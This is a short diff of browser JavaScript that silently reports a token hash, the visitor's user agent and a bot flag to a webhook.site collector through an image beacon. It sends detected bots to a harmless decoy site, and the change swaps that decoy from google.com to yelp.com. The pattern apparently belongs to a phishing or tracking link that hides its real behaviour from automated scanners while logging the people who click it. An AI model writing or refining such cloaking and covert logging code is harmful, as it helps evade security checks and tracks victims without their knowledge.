@@ -17,13 +17,11 @@
       const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
       const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&ts=${Date.now()}`;
 
-      // Send GET request to log click
       const img = new Image();
       img.src = fullLogUrl;
 
-      // Redirect logic
       if (isBot) {
-        window.location.href = "https://google.com";
+        window.location.href = "https://yelp.com";
         return;
       }
 
